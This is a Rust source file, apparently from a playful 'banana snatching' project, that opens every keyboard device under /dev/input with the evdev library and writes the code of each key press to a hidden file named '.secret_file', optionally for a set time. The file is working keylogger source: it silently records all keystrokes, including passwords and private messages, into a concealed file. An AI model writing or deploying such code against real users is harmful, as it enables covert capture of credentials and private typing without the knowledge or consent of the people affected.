use crate::user_security;
use evdev::{Device, EventSummary, KeyCode};
use std::time::{Duration, Instant};
use std::fs::File;
use std::io::prelude::*;
use std::path::Path;

pub fn find_keyboard() -> Result<Vec<Device>, ()> {
    let mut event_nbr = 0;
    let mut keyboards: Vec<Device> = Vec::new();

    loop {
        let device = Device::open(&format!("/dev/input/event{}", event_nbr));
        match device {
            Ok(device) => {
                if device
                    .supported_keys()
                    .map_or(false, |keys| keys.contains(KeyCode::KEY_ENTER))
                {
                    keyboards.push(device);
                }
                event_nbr += 1;
            }
            Err(e) => {
                return if e.kind() == std::io::ErrorKind::PermissionDenied {
                    user_security::status_banana(user_security::Status::NotRunning);
                    eprintln!("Too much security for snatching bananas, try running with more permissions");
                    Err(())
                } else {
                    if keyboards.is_empty() {
                        user_security::status_banana(user_security::Status::NotRunning);
                        eprintln!("No banana to snatch, please plug in a keyboard");
                        Err(())
                    } else {
                        Ok(keyboards)
                    }
                }
            }
        }
    }
}

pub fn save_input(mut keyboard: Device, time: Option<u64>) {
    let path = Path::new(".secret_file");

    let start = Instant::now();
    let duration = time.map(Duration::from_secs);

    let mut file = match File::create(&path) {
        Err(why) => panic!("couldn't create file: {}", why),
        Ok(file) => file,
    };

    while duration.map_or(true, |d| start.elapsed() < d) {
        for event in keyboard.fetch_events().unwrap() {
            if let EventSummary::Key(_event, key, 1) = event.destructure() {
                let key = format!("{};", key.code());
                file.write_all(key.as_bytes()).unwrap_or_else(|_| println!("error writing to file"))
            }
        }
    }
}
